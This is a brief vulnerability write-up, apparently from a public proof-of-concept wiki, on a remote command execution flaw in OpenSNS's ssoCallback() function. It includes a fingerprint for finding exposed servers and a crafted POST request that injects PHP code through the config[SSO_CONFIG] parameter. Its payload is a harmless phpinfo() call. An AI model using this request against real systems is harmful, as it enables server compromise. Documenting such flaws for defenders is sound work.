# OpenSNS AuthorizeController.class.php Background Remote Command Execution Vulnerability

## Vulnerability Description

OpenSNS AuthorizeController.class.php file The ssoCallback() function has a command execution vulnerability, and you can obtain server permissions when logging in.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">OpenSNS</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">icon_hash="1167011145"</span>

## Vulnerability reappears

The login page is as follows

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235551772.png)

The vulnerable file is `Application/Admin/Controller/AuthorizeController.class.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634375559893-600bdee5-03fe-4da2-8762-c41ded4f3797.png)

The config parameter is controllable, and the construction request can be written to execute any command through file_put_contents.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634376077943-1f4ae612-7dc6-44a8-963d-0235ce16d1fd.png)

Construct the request package

```php
POST /admin.php?s=/Authorize/ssoCallback\

config[SSO_CONFIG]=phpinfo();
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634376114084-4e3cf1c1-1a1b-4169-bf65-322e2002a947.png)
